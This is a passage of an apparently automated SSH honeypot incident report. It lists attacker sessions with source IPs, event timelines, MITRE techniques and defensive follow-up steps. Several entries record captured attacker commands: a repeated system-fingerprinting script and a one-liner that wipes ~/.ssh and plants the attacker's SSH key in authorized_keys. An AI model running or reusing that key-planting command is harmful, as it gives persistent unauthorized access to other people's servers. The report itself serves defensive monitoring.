| `2026-09-10 19:04:25` | `cowrie.command.failed` |
| `2026-09-10 19:04:26` | `cowrie.log.closed` |
| `2026-09-10 19:04:27` | `cowrie.session.params` |
| `2026-09-10 19:04:27` | `cowrie.command.input` |
| `2026-09-10 19:04:27` | `cowrie.session.file_download` |
| `2026-09-10 19:04:27` | `cowrie.log.closed` |
| `2026-09-10 19:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.23[.]107` to AbuseIPDB if not already reported
- [ ] Block `103.200.23[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86de825212f2

| Field | Detail |
|---|---|
| **Source IP** | `103.200.23[.]107` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:27` | `cowrie.session.connect` |
| `2026-09-10 19:04:27` | `cowrie.client.version` |
| `2026-09-10 19:04:28` | `cowrie.client.kex` |
| `2026-09-10 19:04:29` | `cowrie.login.success` |
| `2026-09-10 19:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.23[.]107` to AbuseIPDB if not already reported
- [ ] Block `103.200.23[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d8970d9cb6

| Field | Detail |
|---|---|
| **Source IP** | `103.200.23[.]107` |
| **First Seen** | 2026-09-10 19:04 |
| **Last Seen** | 2026-09-10 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:04:29` | `cowrie.session.connect` |
| `2026-09-10 19:04:29` | `cowrie.client.version` |
| `2026-09-10 19:04:29` | `cowrie.client.kex` |
| `2026-09-10 19:04:31` | `cowrie.login.success` |
| `2026-09-10 19:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.23[.]107` to AbuseIPDB if not already reported
- [ ] Block `103.200.23[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0d4514a742

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:06 |
| **Last Seen** | 2026-09-10 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:06:06` | `cowrie.session.connect` |
| `2026-09-10 19:06:06` | `cowrie.client.version` |
| `2026-09-10 19:06:06` | `cowrie.client.kex` |
| `2026-09-10 19:06:07` | `cowrie.login.success` |
| `2026-09-10 19:06:08` | `cowrie.session.params` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.success` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.command.input` |
| `2026-09-10 19:06:08` | `cowrie.log.closed` |
| `2026-09-10 19:06:09` | `cowrie.session.params` |
| `2026-09-10 19:06:09` | `cowrie.command.input` |
| `2026-09-10 19:06:09` | `cowrie.log.closed` |
| `2026-09-10 19:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd7545121d5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-10 19:06 |
| **Last Seen** | 2026-09-10 19:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:06:58` | `cowrie.session.connect` |
| `2026-09-10 19:06:58` | `cowrie.client.version` |
| `2026-09-10 19:06:59` | `cowrie.client.kex` |
| `2026-09-10 19:07:01` | `cowrie.login.success` |
| `2026-09-10 19:07:02` | `cowrie.direct-tcpip.request` |
| `2026-09-10 19:07:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-10 19:07:03` | `cowrie.direct-tcpip.data` |
| `2026-09-10 19:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff99bc585c7

| Field | Detail |
|---|---|
| **Source IP** | `37.32.22[.]70` |
| **First Seen** | 2026-09-10 19:08 |
| **Last Seen** | 2026-09-10 19:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:08:30` | `cowrie.session.connect` |
| `2026-09-10 19:08:30` | `cowrie.client.version` |
| `2026-09-10 19:08:30` | `cowrie.client.kex` |
| `2026-09-10 19:08:31` | `cowrie.login.success` |
| `2026-09-10 19:08:33` | `cowrie.session.params` |
| `2026-09-10 19:08:33` | `cowrie.command.input` |
| `2026-09-10 19:08:33` | `cowrie.command.failed` |
| `2026-09-10 19:08:33` | `cowrie.log.closed` |
| `2026-09-10 19:08:34` | `cowrie.session.params` |
| `2026-09-10 19:08:34` | `cowrie.command.input` |
| `2026-09-10 19:08:35` | `cowrie.session.file_download` |
| `2026-09-10 19:08:35` | `cowrie.log.closed` |
| `2026-09-10 19:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.32.22[.]70` to AbuseIPDB if not already reported
- [ ] Block `37.32.22[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3285839f7c40

| Field | Detail |
|---|---|
| **Source IP** | `37.32.22[.]70` |
| **First Seen** | 2026-09-10 19:08 |
| **Last Seen** | 2026-09-10 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:08:35` | `cowrie.session.connect` |
| `2026-09-10 19:08:35` | `cowrie.client.version` |
| `2026-09-10 19:08:35` | `cowrie.client.kex` |
| `2026-09-10 19:08:36` | `cowrie.login.success` |
| `2026-09-10 19:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.32.22[.]70` to AbuseIPDB if not already reported
- [ ] Block `37.32.22[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb16ae2b412e

| Field | Detail |
|---|---|
| **Source IP** | `37.32.22[.]70` |
| **First Seen** | 2026-09-10 19:08 |
| **Last Seen** | 2026-09-10 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:08:37` | `cowrie.session.connect` |
| `2026-09-10 19:08:37` | `cowrie.client.version` |
| `2026-09-10 19:08:37` | `cowrie.client.kex` |
| `2026-09-10 19:08:38` | `cowrie.login.success` |
| `2026-09-10 19:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.32.22[.]70` to AbuseIPDB if not already reported
- [ ] Block `37.32.22[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef313851c5e7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:08 |
| **Last Seen** | 2026-09-10 19:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:08:48` | `cowrie.session.connect` |
| `2026-09-10 19:08:49` | `cowrie.client.version` |
| `2026-09-10 19:08:49` | `cowrie.client.kex` |
| `2026-09-10 19:08:49` | `cowrie.login.success` |
| `2026-09-10 19:08:50` | `cowrie.session.params` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.success` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.command.input` |
| `2026-09-10 19:08:50` | `cowrie.log.closed` |
| `2026-09-10 19:08:51` | `cowrie.session.params` |
| `2026-09-10 19:08:51` | `cowrie.command.input` |
| `2026-09-10 19:08:51` | `cowrie.log.closed` |
| `2026-09-10 19:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7adfad91360c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:11 |
| **Last Seen** | 2026-09-10 19:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:11:28` | `cowrie.session.connect` |
| `2026-09-10 19:11:28` | `cowrie.client.version` |
| `2026-09-10 19:11:28` | `cowrie.client.kex` |
| `2026-09-10 19:11:29` | `cowrie.login.success` |
| `2026-09-10 19:11:30` | `cowrie.session.params` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.success` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.command.input` |
| `2026-09-10 19:11:30` | `cowrie.log.closed` |
| `2026-09-10 19:11:31` | `cowrie.session.params` |
| `2026-09-10 19:11:31` | `cowrie.command.input` |
| `2026-09-10 19:11:31` | `cowrie.log.closed` |
| `2026-09-10 19:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5f538bc7c3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:13 |
| **Last Seen** | 2026-09-10 19:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:13:31` | `cowrie.session.connect` |
| `2026-09-10 19:13:31` | `cowrie.client.version` |
| `2026-09-10 19:13:31` | `cowrie.client.kex` |
| `2026-09-10 19:13:32` | `cowrie.login.success` |
| `2026-09-10 19:13:33` | `cowrie.session.params` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.success` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.command.input` |
| `2026-09-10 19:13:33` | `cowrie.log.closed` |
| `2026-09-10 19:13:34` | `cowrie.session.params` |
| `2026-09-10 19:13:34` | `cowrie.command.input` |
| `2026-09-10 19:13:34` | `cowrie.log.closed` |
| `2026-09-10 19:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74391c6cdd72

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:15 |
| **Last Seen** | 2026-09-10 19:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:15:32` | `cowrie.session.connect` |
| `2026-09-10 19:15:32` | `cowrie.client.version` |
| `2026-09-10 19:15:33` | `cowrie.client.kex` |
| `2026-09-10 19:15:34` | `cowrie.login.success` |
| `2026-09-10 19:15:35` | `cowrie.session.params` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.success` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.command.input` |
| `2026-09-10 19:15:35` | `cowrie.log.closed` |
| `2026-09-10 19:15:36` | `cowrie.session.params` |
| `2026-09-10 19:15:36` | `cowrie.command.input` |
| `2026-09-10 19:15:36` | `cowrie.log.closed` |
| `2026-09-10 19:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-759c4d92dfc4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:17 |
| **Last Seen** | 2026-09-10 19:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:17:24` | `cowrie.session.connect` |
| `2026-09-10 19:17:24` | `cowrie.client.version` |
| `2026-09-10 19:17:24` | `cowrie.client.kex` |
| `2026-09-10 19:17:25` | `cowrie.login.success` |
| `2026-09-10 19:17:26` | `cowrie.session.params` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.success` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.command.input` |
| `2026-09-10 19:17:26` | `cowrie.log.closed` |
| `2026-09-10 19:17:27` | `cowrie.session.params` |
| `2026-09-10 19:17:27` | `cowrie.command.input` |
| `2026-09-10 19:17:27` | `cowrie.log.closed` |
| `2026-09-10 19:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80c341ec7de

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:19 |
| **Last Seen** | 2026-09-10 19:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:19:34` | `cowrie.session.connect` |
| `2026-09-10 19:19:34` | `cowrie.client.version` |
| `2026-09-10 19:19:34` | `cowrie.client.kex` |
| `2026-09-10 19:19:35` | `cowrie.login.success` |
| `2026-09-10 19:19:36` | `cowrie.session.params` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.success` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.command.input` |
| `2026-09-10 19:19:36` | `cowrie.log.closed` |
| `2026-09-10 19:19:37` | `cowrie.session.params` |
| `2026-09-10 19:19:37` | `cowrie.command.input` |
| `2026-09-10 19:19:37` | `cowrie.log.closed` |
| `2026-09-10 19:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53b31ce7258

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:22 |
| **Last Seen** | 2026-09-10 19:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:22:23` | `cowrie.session.connect` |
| `2026-09-10 19:22:23` | `cowrie.client.version` |
| `2026-09-10 19:22:23` | `cowrie.client.kex` |
| `2026-09-10 19:22:23` | `cowrie.login.success` |
| `2026-09-10 19:22:24` | `cowrie.session.params` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.success` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.command.input` |
| `2026-09-10 19:22:24` | `cowrie.log.closed` |
| `2026-09-10 19:22:25` | `cowrie.session.params` |
| `2026-09-10 19:22:25` | `cowrie.command.input` |
| `2026-09-10 19:22:25` | `cowrie.log.closed` |
| `2026-09-10 19:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521738021939

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:25 |
| **Last Seen** | 2026-09-10 19:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
